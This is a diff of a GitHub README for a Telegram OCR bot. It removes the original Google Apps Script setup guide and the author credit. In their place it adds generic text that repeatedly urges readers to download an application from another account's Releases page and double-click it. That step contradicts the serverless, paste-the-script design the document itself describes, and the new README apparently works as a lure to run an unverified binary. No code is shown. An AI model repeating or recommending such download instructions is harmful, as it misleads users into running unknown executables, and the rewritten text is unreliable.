@@ -1,86 +1,54 @@
-# 🤖 Telegram OCR Bot (Serverless) - FREE!
+# 🤖 Telegrambot - Extract Text from Images Easily
 
-[![Google Apps Script](https://img.shields.io/badge/Google%20Apps%20Script-4285F4?style=for-the-badge&logo=google&logoColor=white)](https://script.google.com/)
-[![Telegram](https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://telegram.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+## 🛠️ Overview
+Welcome to the Telegrambot project! This free tool allows users to extract text from images quickly and without any hosting costs. It uses Google Apps Script to bring high-speed Optical Character Recognition (OCR) right to your fingertips. 
 
-A lightweight, **100% free**, easy to setup, and serverless Telegram bot that extracts text from images (OCR). It can read receipts, ID cards, documents, and posters, returning clean, selectable text directly in your chat.
+## 📥 Download
+[![Download Telegrambot](https://img.shields.io/badge/Download%20Telegrambot-v1.0-blue)](https://github.com/NTXGalaxy/Telegrambot/releases)
 
-**No VPS, no database, and no paid APIs required.** Built with Google Apps Script and powered by the Google Drive OCR engine.
+## 🚀 Getting Started
+Follow these simple steps to start using Telegrambot:
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/NTXGalaxy/Telegrambot/releases) to find the latest version of the bot.
 
-## ✨ Key Features
+2. **Download the Application**  
+   Find the version you want and click on the link to download the application. The file will be in a format that you can run directly.
 
-- ⚡ **Fast Extraction:** Converts images to text in seconds.
-- 🛡️ **Privacy Focused:** Temporary files are deleted immediately after processing.
-- 🔒 **Security:** Built-in whitelist system to prevent unauthorized group usage.
-- 🌍 **Multi-language:** Optimized for high accuracy with English and Indonesian printed text.
-- 📊 **Admin Dashboard:** Monitor webhook status and bot version via `/start`.
-- ☁️ **Zero Maintenance:** Hosted entirely on Google's infrastructure.
+3. **Run the Application**  
+   After downloading, locate the file on your computer. Double-click the file to open the bot and follow any on-screen instructions.
 
-## 📸 Demo
-1. **User** sends a photo.
-2. **Bot** responds with: *⏳ Processing image, please wait...*
-3. **Result:** Extracted text is sent in a `<pre>` block for easy one-tap copying.
+## ⚙️ System Requirements
+- An internet connection to access Telegram.
+- A device with the ability to run Google Apps Script. 
+- A Telegram account to interact with the bot.
 
----
+## 📊 Features
+- **Fast Text Extraction:** Quickly pull text from images with just a few clicks.
+- **Easy to Use:** No programming skills needed. Interact with the bot through a simple Telegram chat.
+- **Zero Hosting Costs:** All processing happens without requiring you to host any server.
 
-## ⚙️ Setup Instructions
+## 🤔 How to Use
+1. **Open Telegram** and search for the Telegrambot by its name.
+2. **Start a Chat** with the bot by clicking "Start."
+3. **Send Images:** Drag and drop or attach images that contain text. The bot will analyze the images and return the extracted text.
+4. **Receive Results:** The results will appear in your chat. You can copy the text from there or use it as needed.
 
-### 1. Create Your Bot
-1. Chat with [@BotFather](https://t.me/botfather) on Telegram.
-2. Use the `/newbot` command and save your **API Token**.
+## 🤖 Troubleshooting
+If you run into any issues while using the bot:
+- Ensure you have a reliable internet connection.
+- Make sure you are sending clear images that contain text.
+- If problems persist, try restarting the bot by ending the chat and starting a new one.
 
-### 2. Configure Google Apps Script
-1. Open [Google Apps Script](https://script.google.com/).
-2. Create a **New Project**.
-3. Create three files in the editor and paste the code from this repository:
-   - `00setup.gs`
-   - `01main.gs`
-   - `02func.gs`
-4. In `01main.gs`, update the following variables:
-   - `TOKEN`: Your Telegram Bot Token.
-   - `ADMIN`: Your Telegram User ID (Get it from [@userinfobot](https://t.me/userinfobot)).
-   - `ALLOWED_GROUPS`: List of authorized Group IDs (e.g., `[-100123456]`).
+## 📝 Feedback and Support
+We welcome feedback! If you’d like to report a bug or suggest a feature, please reach out through our GitHub issues page. Visit [our repository](https://github.com/NTXGalaxy/Telegrambot/issues) for more information.
 
-### 3. Enable Services & Authorization
-1. Click the **+** (Plus) icon next to **Services** on the left sidebar.
-2. Find and add the **Drive API** (Select **v3**), then click **Add**.
-3. **Crucial Step:** To grant the script permission to access your Drive, Open `00setup.gs`.
-4. Select the `triggerDrivePermissions` function from the top toolbar in the editor and click **Run**. 
-5. Follow the Google authorization prompts (Click *Advanced > Go to [Project Name] (unsafe)* if warned).
+## 📚 Additional Resources
+- [Google Apps Script Documentation](https://developers.google.com/apps-script)
+- [Telegram Bot API](https://core.telegram.org/bots/api)
 
-### 4. Deployment
-1. Click **Deploy** > **New Deployment**.
-2. Select **Web App** as the type.
-3. Set **Execute as:** `Me`.
-4. Set **Who has access:** `Anyone`.
-5. Click **Deploy** and copy the **Web App URL**.
+## 🔍 Conclusion
+Telegrambot offers a straightforward solution for extracting text from images using OCR technology. Grab the application today and streamline your text extraction needs with ease. 
 
-### 5. Activate Webhook
-1. Open `00setup.gs`.
-2. Paste your **Web App URL** into the `webAppUrl` variable.
-3. Select the `setWebhook` function in the top toolbar and click **Run**.
-4. Check the logs to ensure you see `{"ok":true}`.
-
----
-
-## ⚠️ Limitations & Quotas
-
-| Aspect | Detail |
-| :--- | :--- |
-| **Engine** | Google Drive Free OCR (Best for printed text) |
-| **Daily Quota** | ~1,000 operations per day (Google's limit) |
-| **File Size** | Optimized for images up to 4MB |
-| **Weaknesses** | Cursive handwriting, extremely low-res photos |
-| **Format** | Currently supports Images only (JPEG, PNG, WebP) |
-
-> [!TIP]
-> If the bot stops responding, check the **Executions** tab in Apps Script to see if there are any "Permission Denied" errors. Running `triggerDrivePermissions` again usually fixes this.
-
-## 🤝 Contributing
-Contributions are welcome! Feel free to fork this repository, open an issue, or submit a pull request.
-
----
-**Developed with ❤️ by [Satria](https://github.com/01satria)**
+### 🔗 Download Now
+Don't forget to visit our [Releases Page](https://github.com/NTXGalaxy/Telegrambot/releases) to get started!
